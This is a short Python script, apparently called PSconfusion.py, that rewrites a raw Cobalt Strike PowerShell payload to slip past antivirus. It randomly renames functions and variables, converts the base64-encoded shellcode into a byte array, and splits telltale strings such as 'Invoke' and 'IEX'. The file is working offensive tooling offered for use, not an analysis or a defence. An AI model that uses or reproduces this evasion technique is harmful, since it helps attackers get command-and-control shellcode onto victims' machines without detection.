import random
import sys
import re
import base64

def randomName():
    str = ""
    for lenth in range(random.randint(1, 5)):
        str += random.choice('abcdefghijklmnopqrstuvwxyzQWERTYUIOPASDFGHJKLZXCVBNM')
    return str

def confusion(payload):
    AVpayload = payload
    shellcode = '[Byte[]]('

    VarFuncNamePattern = r'function [\w_]+'
    VarBase64Pattern = r"FromBase64String\('.+'\)"
    VarPattern = r"\$[\w_]{2,}"

    VarFuncName = re.findall(VarFuncNamePattern, payload)
    VarBase64 = re.findall(VarBase64Pattern, payload)[0]
    Vars = list(set(re.findall(VarPattern, payload)))
    Vars.remove('$True')
    Vars.remove('$false')
    Vars.remove('$null')

    # 随机混淆
    for Name in VarFuncName:
        AVpayload = re.sub(Name[9:], randomName(), AVpayload)
    for Var in Vars:
        AVpayload = re.sub(Var[1:], randomName(), AVpayload)
    for i in base64.b64decode(VarBase64[18:-2]):
        shellcode += str(i) + ','
    shellcode = shellcode[:-1] + ')'
    AVpayload = re.sub(r"\[System.Convert\]::FromBase64String\('.+'\)", shellcode, AVpayload)
    AVpayload = re.sub(r"'Invoke'", r"'Invo'+'ke'", AVpayload)
    AVpayload = re.sub(r"IEX", r"I`eX", AVpayload)

    return AVpayload


if __name__ == "__main__":
    try:
        f = open(sys.argv[1],'r')
        p = open(sys.argv[2],'w')
    except:
        print("Usage: python3 PSconfusion.py RawCSpayload.ps1 ConfusionPayload.ps1")
    payload = f.read()
    p.write(confusion(payload))
    f.close()
    p.close()
